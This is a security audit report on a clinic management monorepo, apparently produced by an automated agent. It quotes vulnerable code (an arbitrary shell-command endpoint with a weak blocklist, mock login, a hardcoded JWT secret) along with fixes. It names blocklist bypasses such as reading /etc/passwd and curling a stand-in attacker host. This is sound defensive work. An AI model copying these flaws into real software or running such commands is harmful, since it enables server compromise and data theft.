# Security Analysis and Risk Assessment
## OrthoPlus-ModularDB Repository
**Date:** 2026-03-17
**Analysis Type:** Comprehensive Forensic Security Audit
**Classification:** CRITICAL - NOT PRODUCTION READY

---

## Executive Summary

This repository implements a fullstack monorepo (Vite/React frontend + Node/Express backend) with declared intent of "modernization" and modularization. However, the current state contains **CRITICAL SECURITY VULNERABILITIES** that make it **UNSUITABLE FOR PRODUCTION DEPLOYMENT**:

### Critical Findings (P0)
1. ✋ **Authentication Bypass** - Mock authentication accepts any credentials
2. ✋ **Multi-tenant Data Leakage** - Inconsistent clinic_id isolation
3. ✋ **Remote Command Execution** - Exposed OS command execution endpoint
4. ✋ **SQL Injection Risks** - Broken SQL queries and unsafe raw SQL
5. ✋ **Missing Dependencies** - Backend imports axios but doesn't declare it
6. ✋ **Infrastructure Misconfiguration** - Docker configs prevent deployment

### Risk Assessment
- **Data Breach Risk:** HIGH - Cross-tenant data leakage possible
- **RCE (Remote Code Execution):** CRITICAL - Direct OS command execution
- **Authentication Risk:** CRITICAL - Anyone can obtain valid JWT tokens
- **Operational Risk:** HIGH - Build/deployment will fail

### Recommendation
**DO NOT DEPLOY TO PRODUCTION** until all P0 (Priority 0) issues are resolved.

---

## Detailed Findings

### Category: Authentication & Authorization

#### FR-001 — CRITICAL: Authentication Middleware Bypasses Security
**File:** `backend/src/middleware/authMiddleware.ts:16-17, 27-28`

**Issue:**
- Middleware returns `next()` if no Bearer token present (lines 16-17)
- Falls back to `"mock-clinic-id"` when token lacks clinicId (line 28)
- Uses fallback JWT secret `"supersecretmockjwt"` (line 24)

**Impact:**
- API endpoints can be accessed without authentication
- Multi-tenant isolation fails with mock clinic ID
- Production deployment with weak secret

**Evidence:**
```typescript
if (!authHeader || !authHeader.startsWith("Bearer ")) {
  return next(); // ← Allows unauthenticated access
}

req.clinicId = decoded.clinicId || "mock-clinic-id"; // ← Tenant bypass
```

**OWASP Reference:** A01:2021 – Broken Access Control

---

#### FR-002 — CRITICAL: Mock Authentication Controller
**File:** `backend/src/modules/auth/api/AuthController.ts:6-42`

**Issue:**
- `login()` accepts ANY email/password without validation (lines 7-10)
- Returns valid JWT for any credentials (lines 22-26)
- Uses hardcoded `dummyId` for all users (line 14)
- Fallback secret `"supersecretmockjwt"` (line 24)

**Impact:**
- Complete authentication bypass
- All users share same ID in logs/audit trail
- JWT tokens can be forged if secret leaks

**Evidence:**
```typescript
public login = async (req: Request, res: Response) => {
  const { email, password } = req.body;
  // NO PASSWORD VALIDATION! ← Critical vulnerability

  const dummyId = "00000000-0000-0000-0000-000000000000";
  const token = jwt.sign(
    { sub: profile.id, email: profile.email, role: "authenticated" },
    process.env.JWT_SECRET || "supersecretmockjwt", // ← Weak fallback
```

**OWASP Reference:** A07:2021 – Identification and Authentication Failures

---

#### FR-003 — CRITICAL: JWT Token Missing clinicId
**File:** `backend/src/modules/auth/api/AuthController.ts:22-26`

**Issue:**
- JWT payload doesn't include `clinicId` claim
- Middleware falls back to `"mock-clinic-id"` (authMiddleware.ts:28)
- Multi-tenant isolation depends on this missing field

**Impact:**
- Cannot enforce tenant boundaries
- Data leakage between clinics
- IDOR (Insecure Direct Object Reference) vulnerabilities

**Fix Required:**
```typescript
const token = jwt.sign(
  {
    sub: profile.id,
    email: profile.email,
    role: "authenticated",
    clinicId: profile.clinic_id // ← MUST be added
  },
  process.env.JWT_SECRET,
  { expiresIn: "1h" }
);
```

---

### Category: Remote Code Execution

#### FR-007 — CRITICAL: OS Command Execution Endpoint
**File:** `backend/src/modules/admin_tools/api/controller.ts:161-184`

**Issue:**
- Exposes `/api/admin/execute-command` endpoint (router.ts:16-20)
- Executes arbitrary shell commands via `child_process.exec` (line 176)
- Weak blocklist only checks for `rm`, `mv`, `sudo` (lines 168-174)
- No authentication/authorization check

**Impact:**
- **Remote Code Execution (RCE)** - Attacker can run arbitrary commands
- Server compromise, data exfiltration, cryptomining, backdoors
- Bypass blocklist with alternatives: `cat /etc/passwd`, `curl attacker.com`, `node malicious.js`

**Evidence:**
```typescript
public executeCommand = async (req: Request, res: Response) => {
  const { command } = req.body;

  // Weak blocklist - many dangerous commands NOT blocked
  if (command.includes("rm ") || command.includes("mv ") || command.includes("sudo ")) {
    return res.status(403).json({ error: "Unsafe commands blocked." });
  }

  const { stdout, stderr } = await execPromise(command); // ← RCE!
  return res.status(200).json({ stdout, stderr });
};
```

**OWASP Reference:** A03:2021 – Injection

**Immediate Action:** DISABLE this endpoint in production via environment variable gate.

---

#### FR-008 — CRITICAL: Privilege Escalation via Raw SQL
**File:** `backend/src/modules/admin_tools/api/controller.ts:69-94`

**Issue:**
- `createRootUser` uses `$executeRawUnsafe` (lines 80-85)
- Modifies `auth.users` table directly (Supabase legacy)
- Sets `is_super_admin: true` metadata
- No authorization check for who can create root users

**Impact:**
- Privilege escalation to super admin
- SQL injection via unsanitized email (though parameterized here)
- Bypasses normal RBAC flows

**Evidence:**
```typescript
await prisma.$executeRawUnsafe(
  `UPDATE auth.users SET raw_user_meta_data = raw_user_meta_data || '{"is_super_admin": true}'::jsonb WHERE email = $1;`,
  email,
).catch(() => {});
```

---

### Category: Multi-Tenant Data Leakage

#### FR-009 — ALTO: Global Search Without Tenant Filter
**File:** `backend/src/modules/admin_tools/api/controller.ts:186-228`

**Issue:**
- `globalSearch` queries patients/dentists without `clinic_id` filter
- Returns data from ALL clinics (lines 196-206, 210-220)
- No tenant isolation

**Impact:**
- Cross-clinic data leakage
- GDPR/LGPD violations (exposing patient data to wrong clinic)

**Evidence:**
```typescript
results.patients = await (prisma as any).patients.findMany({
  where: {
    OR: [
      { name: { contains: String(query), mode: "insensitive" } },
      { cpf: { contains: String(query) } },
    ],
    // ← Missing: clinic_id: req.clinicId
  },
  take: 10,
});
```

---

#### FR-012 — CRITICAL: Financial Transactions IDOR
**File:** `backend/src/modules/financeiro/api/FinanceiroController.ts`

**Issue:**
- `getTransaction`, `updateTransaction`, `deleteTransaction` methods fetch by ID only
- No `clinic_id` filter in WHERE clause
- User can access/modify transactions from other clinics

**Impact:**
- Financial data breach
- Unauthorized modification/deletion of financial records
- Compliance violations (PCI-DSS, SOX)

**Fix Pattern:**
```typescript
const transaction = await prisma.transactions.findUnique({
  where: {
    id: req.params.id,
    clinic_id: req.clinicId // ← MUST add tenant filter
  }
});
```

---

### Category: SQL Injection & Database Issues

#### FR-016 — CRITICAL: Broken SQL Queries
**File:** `backend/src/modules/pacientes/infrastructure/repositories/PatientRepositoryPostgres.ts`

**Issue:**
- SQL strings with missing placeholders (lines 8, 14, 22, 59, 66)
- Example: `WHERE id = ` (no `$1` placeholder)
- Example: `VALUES (, , , ...)` (empty value slots)

**Impact:**
- Runtime crashes when repository methods are called
- If "fixed" incorrectly, could introduce SQL injection
- Module is currently non-functional

**Evidence:**
```sql
-- Line 8 (approximate)
WHERE id =   -- ← Missing $1 placeholder

-- Line 14 (approximate)
VALUES (, , , ...)  -- ← Missing all value placeholders
```

**Status:** This module CANNOT execute safely. Needs complete rewrite.

---

#### FR-018 — CRITICAL: Invalid SQL Syntax in Jobs
**File:** `backend/src/workers/jobs/gamificationJobs.ts:31-32`

**Issue:**
- SQL query has `LIMIT 1000` BEFORE `WHERE` clause
- Violates SQL syntax rules (LIMIT must come after WHERE)

**Impact:**
- Gamification cron job fails on every execution
- Error logs accumulate
- Gamification features don't work

**Evidence:**
```typescript
const metas = await prisma.$queryRawUnsafe<any[]>(
  `
  SELECT * FROM gamification_goals LIMIT 1000
  WHERE clinic_id = $1 AND status = 'ACTIVE' AND deadline >= NOW()
  `,
  clinic.id,
);
```

**Fix:**
```sql
SELECT * FROM gamification_goals
WHERE clinic_id = $1 AND status = 'ACTIVE' AND deadline >= NOW()
LIMIT 1000  -- ← Move LIMIT to end
```

---

### Category: Dependencies & Build

#### FR-020 — CRITICAL: Missing Dependency (axios)
**File:** `backend/src/modules/admin_tools/api/controller.ts:2`
**File:** `backend/package.json` (axios not listed)

**Issue:**
- Code imports `axios` (line 2)
- `package.json` doesn't declare axios as dependency
- Backend build/runtime will crash when loading admin_tools module

**Impact:**
- Build failures in CI/CD
- Runtime crashes: `Cannot find module 'axios'`
- Admin tools module completely broken

**Evidence:**
```typescript
// controller.ts:2
import axios from "axios"; // ← Imported but not in package.json
```

**Fix:** Add to backend/package.json dependencies:
```json
"axios": "^1.6.0"
```

---

#### FR-021-022 — CRITICAL: Docker Configuration Mismatch
**Files:**
- `Dockerfile:28, 52`
- `docker-compose.yml:12-14`

**Issues:**
1. **Dockerfile** installs only production deps (`npm ci --only=production`)
2. Then runs `vite preview` which requires `vite` (a devDependency)
3. **docker-compose.yml** exposes `5173:5173` (Vite dev port)
4. **Dockerfile** exposes `8080` and runs on port 8080

**Impact:**
- Container startup fails: `vite: command not found`
- Port mismatch between Compose and Dockerfile
- Deployment completely broken

**Fix:** Use nginx to serve built static files (see detailed patch in analysis)

---

## Priority 0 (P0) Remediation Plan

### Must Fix Before ANY Production Deployment

| ID | Issue | Effort | Files |
|----|-------|--------|-------|
| FR-001 | Auth bypass in middleware | 4h | `authMiddleware.ts` |
| FR-002 | Mock AuthController | 8h | `AuthController.ts` |
| FR-003 | Missing clinicId in JWT | 2h | `AuthController.ts` |
| FR-007 | RCE via executeCommand | 2h | `admin_tools/controller.ts`, `router.ts` |
| FR-016 | Broken SQL in patient repo | 16h | `PatientRepositoryPostgres.ts` |
| FR-018 | Invalid SQL in gamification | 1h | `gamificationJobs.ts` |
| FR-020 | Missing axios dependency | 0.5h | `backend/package.json` |
| FR-021/022 | Docker config issues | 4h | `Dockerfile`, `docker-compose.yml` |

**Total Estimated Effort:** 37.5 hours (minimum)

---

## Validation & Testing Requirements

### Security Tests Required

1. **Authentication Tests**
   - ❌ Reject requests without Bearer token to protected endpoints
   - ❌ Reject invalid JWT tokens
   - ❌ Reject tokens without clinicId claim
   - ❌ Verify JWT_SECRET is required (no fallback)

2. **Multi-Tenant Isolation Tests**
   - ❌ Clinic A cannot access Clinic B's patients
   - ❌ Clinic A cannot access Clinic B's financial transactions
   - ❌ Global search filters by clinicId
   - ❌ All Prisma queries include clinic_id filter

3. **Infrastructure Tests**
   - ❌ Docker build completes successfully
   - ❌ Container starts without errors
   - ❌ Backend serves on correct port
   - ❌ Health endpoint returns 200

4. **Regression Tests**
   - ❌ E2E tests pass with real authentication
   - ❌ No TypeScript compilation errors
   - ❌ No ESLint errors in security-critical files

---

## Environment Variable Requirements

### Required in Production (No Defaults)

```bash
# Authentication (REQUIRED - no fallback)
JWT_SECRET=<256-bit random string>

# Database (REQUIRED)
DB_HOST=<postgres-host>
DB_PORT=5432
DB_NAME=orthoplus
DB_USER=<db-user>
DB_PASSWORD=<secure-password>
DB_SSL=true

# Redis (REQUIRED for caching)
REDIS_URL=redis://<redis-host>:6379

# Feature Flags (REQUIRED for security)
ENABLE_DANGEROUS_ADMIN_ENDPOINTS=false  # ← MUST be false in prod
AUTH_ALLOW_MOCK=false                    # ← MUST be false in prod

# Email (Optional but recommended)
RESEND_API_KEY=<resend-key>

# GitHub Integration (Optional)
GITHUB_TOKEN=<github-token>
```

### Startup Validation Script

Add to `backend/src/index.ts`:

```typescript
function validateRequiredEnvVars() {
  const required = ['JWT_SECRET', 'DB_HOST', 'DB_NAME', 'DB_USER', 'DB_PASSWORD', 'REDIS_URL'];
  const missing = required.filter(key => !process.env[key]);

  if (missing.length > 0) {
    console.error(`❌ Missing required environment variables: ${missing.join(', ')}`);
    process.exit(1);
  }

  if (process.env.JWT_SECRET === 'supersecretmockjwt') {
    console.error('❌ Using default JWT_SECRET is not allowed in production');
    process.exit(1);
  }

  if (process.env.ENABLE_DANGEROUS_ADMIN_ENDPOINTS === 'true') {
    console.warn('⚠️  WARNING: Dangerous admin endpoints are ENABLED');
  }
}
```

---

## Compliance & Regulatory Impact

### LGPD (Lei Geral de Proteção de Dados - Brazil)

**Violations:**
- ❌ Cross-clinic patient data leakage (Art. 46 - Security)
- ❌ No access controls on sensitive data (Art. 47 - Data Breach)
- ❌ Inadequate technical safeguards (Art. 50 - Security Measures)

**Potential Fines:** Up to 2% of revenue or R$ 50 million per violation

### OWASP Top 10:2021 Mapping

| OWASP Risk | Finding IDs | Severity |
|------------|-------------|----------|
| A01: Broken Access Control | FR-001, FR-003, FR-009, FR-012 | Critical |
| A02: Cryptographic Failures | FR-002 (weak JWT secret) | High |
| A03: Injection | FR-007, FR-008, FR-016, FR-018 | Critical |
| A07: Authentication Failures | FR-002, FR-003 | Critical |

---

## Recommended Next Steps

### Immediate (Within 24 hours)
1. ✅ Create this security analysis document
2. ⏳ Add `axios` to backend dependencies (FR-020)
3. ⏳ Disable `executeCommand` endpoint via env var (FR-007)
4. ⏳ Fix SQL syntax in gamification jobs (FR-018)
5. ⏳ Add JWT_SECRET validation on startup

### Short-term (Week 1)
1. Remove mock authentication and implement real auth
2. Add clinicId to JWT payload
3. Implement tenant isolation guard middleware
4. Fix Docker configuration for production deployment
5. Add environment variable validation

### Medium-term (Weeks 2-4)
1. Audit ALL Prisma queries for clinic_id filters
2. Fix broken SQL in patient repository
3. Implement comprehensive E2E security tests
4. Add RBAC (Role-Based Access Control) enforcement
5. Security training for development team

---

## References

- **OWASP ASVS 4.0:** Application Security Verification Standard
  - Section 4.1: Access Control
  - Section 9.1: Communication Security

- **OWASP Top 10:2021**
  - https://owasp.org/Top10/

- **LGPD (Brazil Data Protection Law)**
  - Lei nº 13.709/2018

- **CWE (Common Weakness Enumeration)**
  - CWE-78: OS Command Injection
  - CWE-89: SQL Injection
  - CWE-287: Improper Authentication
  - CWE-639: Authorization Bypass

---

## Document Control

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | 2026-03-17 | Security Analysis Agent | Initial comprehensive audit |

**Next Review Date:** After P0 fixes are implemented

**Document Classification:** INTERNAL - SECURITY SENSITIVE

---

## Appendix: Code Patches

### Patch 1: Fix Missing axios Dependency

```diff
diff --git a/backend/package.json b/backend/package.json
index 0000000..1111111 100644
--- a/backend/package.json
+++ b/backend/package.json
@@ -13,6 +13,7 @@
   "dependencies": {
     "@prisma/client": "^6.4.1",
+    "axios": "^1.6.0",
     "bcrypt": "^5.1.1",
     "cors": "^2.8.5",
```

### Patch 2: Disable Dangerous Endpoints

```diff
diff --git a/backend/src/modules/admin_tools/api/router.ts b/backend/src/modules/admin_tools/api/router.ts
index 0000000..1111111 100644
--- a/backend/src/modules/admin_tools/api/router.ts
+++ b/backend/src/modules/admin_tools/api/router.ts
@@ -13,7 +13,13 @@ router.get("/adr", controller.listADRs.bind(controller));
 router.post("/adr", controller.createADR.bind(controller));

-router.post("/execute-command", controller.executeCommand.bind(controller));
+router.post("/execute-command", (req, res) => {
+  if (process.env.ENABLE_DANGEROUS_ADMIN_ENDPOINTS !== "true") {
+    return res.status(404).json({ error: "Not found" });
+  }
+  return controller.executeCommand(req, res);
+});
+
 router.post("/github-proxy", controller.githubProxy.bind(controller));
```

### Patch 3: Fix SQL Syntax in Gamification Jobs

```diff
diff --git a/backend/src/workers/jobs/gamificationJobs.ts b/backend/src/workers/jobs/gamificationJobs.ts
index 0000000..1111111 100644
--- a/backend/src/workers/jobs/gamificationJobs.ts
+++ b/backend/src/workers/jobs/gamificationJobs.ts
@@ -28,9 +28,11 @@ export async function checkGoalDeadlines() {
     for (const clinic of clinics) {
-      const metas = await prisma.$queryRawUnsafe<any[]>(
-        `
-        SELECT * FROM gamification_goals LIMIT 1000
-        WHERE clinic_id = $1 AND status = 'ACTIVE' AND deadline >= NOW()
+      const metas = await prisma.$queryRaw<any[]>`
+        SELECT *
+        FROM gamification_goals
+        WHERE clinic_id = ${clinic.id}
+          AND status = 'ACTIVE'
+          AND deadline >= NOW()
+        LIMIT 1000
-        `,
-        clinic.id,
-      );
+      `;
```

### Patch 4: Add Environment Variable Validation

```diff
diff --git a/backend/src/index.ts b/backend/src/index.ts
index 0000000..1111111 100644
--- a/backend/src/index.ts
+++ b/backend/src/index.ts
@@ -10,6 +10,28 @@ import helmet from "helmet";

 dotenv.config();

+// Security: Validate required environment variables
+function validateEnvironment() {
+  const required = ['JWT_SECRET', 'DB_HOST', 'DB_NAME', 'DB_USER', 'DB_PASSWORD'];
+  const missing = required.filter(key => !process.env[key]);
+
+  if (missing.length > 0) {
+    console.error(`❌ Missing required environment variables: ${missing.join(', ')}`);
+    process.exit(1);
+  }
+
+  if (process.env.JWT_SECRET === 'supersecretmockjwt') {
+    console.error('❌ Using default JWT_SECRET is not allowed');
+    process.exit(1);
+  }
+
+  if (process.env.ENABLE_DANGEROUS_ADMIN_ENDPOINTS === 'true') {
+    console.warn('⚠️  WARNING: Dangerous admin endpoints are ENABLED (not recommended for production)');
+  }
+}
+
+validateEnvironment();
+
 const app = express();
 const PORT = process.env.PORT || 3005;
```

---

**END OF SECURITY ANALYSIS**
